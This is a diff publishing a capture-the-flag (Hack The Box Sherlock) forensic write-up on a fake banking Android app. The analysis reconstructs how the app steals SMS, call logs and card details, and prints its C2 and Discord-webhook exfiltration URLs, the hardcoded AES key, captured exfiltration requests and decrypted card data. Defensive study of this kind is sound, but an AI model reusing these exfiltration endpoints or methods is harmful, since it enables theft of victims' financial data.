@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>HookFlare - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/HookFlare.html" />
     <!-- Sherlock-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for HookFlare sherlock - Medium difficulty level">
+    <meta name="description" content="Writeup for HookFlare sherlock - Medium difficulty level">
     <meta name="keywords" content="Sherlock, HookFlare, Medium, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
 </head>
 <body>
@@ -64,16 +64,193 @@
         <h1 class="writeup-title">HookFlare</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active sherlock</span>
+            <span class="date">February 19, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Sherlock-specific content goes here -->
                 <p><img alt="solved" src="../images/HookFlare/solved.png" /></p>
-<p>HookFlare is an ACTIVE sherlock!</p>
-<p>This write-up will go live once HookFlare retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the sherlock is still live.</p>
+<pre class="codehilite"><code>A S1rBank client reported unauthorized transactions. The victim received an SMS urging a banking app update via a link, which installed a dormant app mimicking the bank’s official version.
+Once activated, it stole credentials, bypassed 2FA via SMS interception, and exfiltrated data. As a DFIR specialist, analyze the Android disk image to uncover the malware’s operation, reconstruct the attack chain, and identify critical IoCs.
+</code></pre>
+
+<h1>Task 1</h1>
+<p><code>Provide the UTC timestamp of the phishing SMS.</code></p>
+<p><img alt="files" src="../images/HookFlare/files.png" /></p>
+<p>The challenge archive contains 2 files. A PCAP file and a disk image file. First, I will mount the image so that I can access the filesystem.</p>
+<p><img alt="details" src="../images/HookFlare/details.png" /></p>
+<p>This is a raw ext4 filesystem image. This makes mounting it easy, as it lacks partitions, and I don't need to worry about offsets as a result.</p>
+<pre class="codehilite"><code>sudo mkdir /mnt/hookflare | Creates a mount point
+
+sudo mount -o loop,ro HookFlare.dd /mnt/hookflare | Mounts the image as a loop device, in a read-only mode
+</code></pre>
+
+<p><img alt="error" src="../images/HookFlare/error.png" /></p>
+<p>I added the <code>noload</code> flag to skip the journal recovery, as I want to mount the image as is.</p>
+<p><img alt="filesystem" src="../images/HookFlare/filesystem.png" /></p>
+<p>Now I can actually proceed with investigating the filesystem. On Android, SMS data can be stored in a few locations. The main one being the <code>/data/data/com.android.providers.telephony/databases/mmssms.db</code> database.</p>
+<p><img alt="nofile" src="../images/HookFlare/nofile.png" /></p>
+<p>This database doesn't exist in the image. Another location, specifically for Google messages, is <code>/data/data/com.google.android.apps.messaging/databases/bugle_db</code></p>
+<p><img alt="exists" src="../images/HookFlare/exists.png" /></p>
+<p>This database does exist. It contains a lot of tables, but the most interesting one for this question is <code>conversations</code>, containing snippets of certain SMS conversations of the user.</p>
+<p><img alt="conversations" src="../images/HookFlare/conversations.png" /></p>
+<p>There is a suspicious entry with the message snippet of <code>S1rBank Alert: We detected a paid process of $700.00 (Ref #971253158RS) on your account. To confirm this transaction, please update your app now: s1rbank.net/app Call +1 (505) 695-1110 for assistance.</code></p>
+<p>It looks a lot like a phishing message. I'll take the timestamp <code>1738426832000</code> of this message, and I'll convert it from epoch.</p>
+<p><img alt="time" src="../images/HookFlare/time.png" /></p>
+<p>The UTC timestamp of this phishing message is <code>2025-02-01 16:20:32</code></p>
+<p><img alt="task1" src="../images/HookFlare/task1.png" /></p>
+<h1>Task 2</h1>
+<p><code>Provide the UTC timestamp marking the start of the malicious application download.</code></p>
+<p>Google Messages does not use Google Chrome for downloads, but a built-in service called <code>Download Manager</code>. These downloads are logged in a database located under <code>data/com.android.providers.downloads/databases/downloads.db</code>. I copied the database to my local directory and changed permissions to avoid issues with the root-owned files in the mounted image.</p>
+<p><img alt="app.png" src="../images/HookFlare/app.png" /></p>
+<p>The timestamp for this download is <code>1738429405215</code> from epoch, which translates into the UTC date of <code>2025-02-01 17:03:23</code></p>
+<p><img alt="task2" src="../images/HookFlare/task2.png" /></p>
+<h1>Task 3</h1>
+<p><code>Provide the package name of the malicious application.</code></p>
+<p>The malicious .apk file itself is located in <code>media/0/Download</code>. I have already seen the malicious package while browsing the <code>data</code> directory, and it is <code>com.s1rx58.s1rbank</code></p>
+<p><img alt="task3" src="../images/HookFlare/task3.png" /></p>
+<h1>Task 4</h1>
+<p><code>Provide the number of runtime permissions granted to the malicious application.</code></p>
+<p>Information about runtime permissions can be found under <code>system/users/0/runtime-permissions.xml</code>. Runtime permissions define what the app can access outside its own sandbox, and are used to prevent apps from gaining access to private data without the user's consent.</p>
+<p>I'll search the .xml file with the package name to find what runtime permission it had been granted.</p>
+<p><img alt="permissions" src="../images/HookFlare/permissions.png" /></p>
+<p>The malware is allowed to read SMS messages, call logs, external storage, and it can write into the external storage as well.</p>
+<p><img alt="task4" src="../images/HookFlare/task4.png" /></p>
+<h1>Task 5</h1>
+<p><code>Provide the last access timestamp for the read sms permission used by the malicious application.</code></p>
+<p>The <code>runtime-permissions.xml</code> file does not contain the access timestamp, nor does the <code>package.xml</code> file. The access timestamp is stored in the <code>appops.xml</code> file under <code>/data/system</code></p>
+<p><img alt="ops" src="../images/HookFlare/ops.png" /></p>
+<p>In this file, operations are represented by numbers. I did not find a clear list of operation codes on the web, but after a deeper dive, I found a reliable source.</p>
+<p><code>https://cs.android.com/android/platform/superproject/+/android-latest-release:frameworks/proto_logging/stats/enums/app_shared/app_op_enums.proto?q=OP_READ_SMS</code></p>
+<p>The listed permissions are, in order:</p>
+<pre class="codehilite"><code>6 = OP_READ_CALL_LOG
+
+14 = OP_READ_SMS
+
+45 = OP_TOAST_WINDOW
+
+59 = OP_READ_EXTERNAL_STORAGE
+
+60 = OP_WRITE_EXTERNAL_STORAGE
+</code></pre>
+
+<p>Transforming the <code>tt</code> timestamp (last time the operation was performed) of OP 14 returns a UTC date of <code>2025-02-01 17:07:18</code></p>
+<p><img alt="task5" src="../images/HookFlare/task5.png" /></p>
+<h1>Task 6</h1>
+<p><code>Provide the URL used by the malware for data exfiltration.</code></p>
+<p>I opened the malicious .apk file with <code>jadx-gui</code>, and searched for the string <code>http://</code> in the code.</p>
+<p><img alt="search" src="../images/HookFlare/search.png" /></p>
+<p>There is an HTTP connection to <code>http://s1rbank.net</code> being made. Looking at the discovered code fragment paints a picture of what the malware does.</p>
+<p><img alt="code" src="../images/HookFlare/code.png" /></p>
+<p>This class serves 3 functions. It checks whether the C2 server is reachable with a HEAD verb request, set to timeout after 5 seconds, and looking for a 200 OK status code response. It returns a bool depending on whether it receives said status code.</p>
+<p>The second part connects to the C2 server and exfiltrates SMS messages and the user's call log. At start, the app will exfiltrate the user's <code>full name</code>, <code>card number</code>, its <code>expiration date</code>, and its <code>CVV</code> number.</p>
+<p><img alt="task6" src="../images/HookFlare/task6.png" /></p>
+<h1>Task 7</h1>
+<p><code>The malicious application checks if the server is live before sending data. Provide the HTTP method used for this check.</code></p>
+<p>The answer has already been found while solving task 6. It is the <code>HEAD</code> HTTP method.</p>
+<p><img alt="task7" src="../images/HookFlare/task7.png" /></p>
+<h1>Task 8</h1>
+<p><code>If the primary server is unavailable, the malicious application redirects data exfiltration to an alternate URL. Identify and provide the alternate URL.</code></p>
+<p>Throughout the <code>c</code> and <code>d</code> functions, the <code>h.i0</code> function is used to encode the exfiltrated payment data. Looking into it, I found an alternate method of data exfiltration.</p>
+<p><img alt="webhook" src="../images/HookFlare/webhook.png" /></p>
+<p>If the primary C2 server is unreachable, the malware will exfiltrate the gathered data by sending a POST request to a Discord application via a webhook in JSON format. The target URL in this case is:</p>
+<p><code>https://discord.com/api/webhooks/1334648260610097303/-Lkxr0eZRO_fb_SaumBbBMZyANM3lyeCkR-E1NXXRASPbtRdNksQSzx4pY1ZGQkFR2H8</code></p>
+<p><img alt="task8" src="../images/HookFlare/task8.png" /></p>
+<h1>Task 9</h1>
+<p><code>The malicious application encrypts data before sending it to the server. Provide the encryption key used.</code></p>
+<p>In the same package, I found a snippet where an AES secret key is initialized. A quick search for <code>secretKeySpec</code> reveals that this is the only secret key in the whole source code. Therefore, I am sure that it is the key being used to AES encrypt data.</p>
+<p><img alt="key" src="../images/HookFlare/key.png" /></p>
+<p>There is no mention of an IV or an authentication tag in the source code, which is very telling for the type of AES encryption used by the malware.</p>
+<p><img alt="task9" src="../images/HookFlare/task9.png" /></p>
+<h1>Task 10</h1>
+<p><code>Credit card information was stolen. What was the second line in the exfiltrated payment information?</code></p>
+<p>For the final task, I will make use of the Packet Capture file provided in the challenge archive. Since I know the two endpoints where the malware posts its data, I will narrow down the packets to those where the protocol is HTTP.</p>
+<p><img alt="wireshark" src="../images/HookFlare/wireshark.png" /></p>
+<p>This pattern is the malware doing exactly what I've uncovered earlier. It is making sure that the C2 server is available by sending a HEAD request, then it POSTs data to said server. In order, the POST requests should contain:</p>
+<pre class="codehilite"><code>1. SMS and CALL_LOG data
+
+2. Full name and card data
+
+3. Payment data
+</code></pre>
+
+<p>For each POST request, I will copy everything as ASCII text. Then, I will pick out the request content, and I'll craft a CyberChef flow that will yield me the plaintext data.</p>
+<pre class="codehilite"><code># POST req 1
+
+''xvEV@@/
+e
+%PJP
+7u[{\0POST /api/data HTTP/1.1
+Content-Type: application/octet-stream
+Data-Type: payment
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; VirtualBox Build/PI)
+Host: s1rbank.net
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 128
+
+/NVEQweZqE3c8BDxTv0vwbwv8Ax1Ry0K6+mUU7dyUjicOu7PEnrPHIEmUe/7ccfKmLKmS2QwIQYN8bm5xh64sIzykyQHWsNPKDnwyQfCNlKns6vPlOmJoc8v003nbqZL
+</code></pre>
+
+<p>The contents are base64-encoded. The decryption flow will start with a b64-decode operation, followed by an AES-ECB decryption operation, set with the uncovered UTF-8 key and no IV(characteristic of AES with ECB encryption mode)</p>
+<p>AES-ECB <code>(Advanced Encryption Standard-Electronic Codebook)</code> is the simplest mode of AES encryption. It divides data into 128-bit blocks and encrypts each block using the same key. Because identical plaintext blocks produce identical ciphertext blocks, it fails to hide data patterns and is insecure for most uses.</p>
+<p><img alt="decrypt1" src="../images/HookFlare/decrypt1.png" /></p>
+<p>The resulting data is:</p>
+<pre class="codehilite"><code>Full Name: PHILLIP KEELING
+Card Number: 5453004085527987
+Expiration Date: 05/27
+CVV: 185
+</code></pre>
+
+<p>This is already enough to answer the question, but I'll take a look at the other packets as well, out of curiosity.</p>
+<pre class="codehilite"><code>''xvE#V@@We%Pd&gt;i
+
+PK3A7w{\3
+POST /api/data HTTP/1.1
+Content-Type: application/octet-stream
+Data-Type: sms
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; VirtualBox Build/PI)
+Host: s1rbank.net
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 512
+5EF4/DDOJEQJDUE6Apk5fJ6igU9OWPN65eLLhpW4t9z7ySfDrXHJVw37dKBUKjwD3GrO5lanjgTMvYCbBCDkb+yD2F0pkwl13KItfpIQOtDKWmbybA6QZKyDCIsxcUUiYpcBisq3aQ7mxG84OHFovKaGx9TnXC9QBUX28hRzJgtwPJ4SUE2PbpVvfdTR74Wo4+KhQl8XGnw/ksT8r2+K6UFFQUf4qx2GxJBo86GO+tARkKjA3LDyZjEE/2cdgptIt++C9T56IY/pQCTzDpYHlldpm9l2ZNRaSNXPribFK1Qc09BgCt64Co4QdOsvwQiN3cjd7Xa4Nibfj7uJVA/zqNIU2896ONwnG0V56PpL8lyQds8e1hXWgJyFIne4gpgHRFDRM45zZkJZarr0PUjhn2/NXVAiJp9VeD5hUQ0p6lhnTXIdEGwWNFh4SFmF4pjA20f9yr0Yb7xVZOX1Q45/ouZIIa1LDpdVs3PmOp+Ner1DE6/TiDZr3Rly+kqm0isE
+</code></pre>
+
+<p><img alt="decrypt2" src="../images/HookFlare/decrypt2.png" /></p>
+<p>This is the exfiltrated SMS data. It matches what I've seen before in the Google Messages database.</p>
+<pre class="codehilite"><code>''xvE?[@@
+e
+%PLoi%
+7w{\3POST /api/data HTTP/1.1
+Content-Type: application/octet-stream
+Data-Type: call_log
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; VirtualBox Build/PI)
+Host: s1rbank.net
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 24
+
+G0hTnSclvRW6aDxFoMwmoA==
+</code></pre>
+
+<p>The SMS data and CALL_LOG data were sent separately in 2 requests. Decrypting this small piece of data returns nothing, though.</p>
+<p><img alt="decrypt3" src="../images/HookFlare/decrypt3.png" /></p>
+<h1>List of gathered IoCs</h1>
+<pre class="codehilite"><code>http://s1rbank.net:80/api/data | Main C2 server URL address/data exfiltration endpoint
+
+https://discord.com/api/webhooks/1334648260610097303/-Lkxr0eZRO_fb_SaumBbBMZyANM3lyeCkR-E1NXXRASPbtRdNksQSzx4pY1ZGQkFR2H8 | Discord webhook URL/Fallback C2 address
+
+0x_S1r_x58!@#53cuReK371337!$%^&amp;* | Hardcoded AES key
+
+SirBank.apk (sha256sum: 9eb7abe41ca8cd04dc00a9655514f94d316086fd851956204bf47122b9528d18) | Malicious .APK file
+
+com.s1rx58.s1rbank | Malicious package
+</code></pre>
+
+<p><img alt="task10" src="../images/HookFlare/task10.png" /></p>
+<p>Solved!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -92,7 +269,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
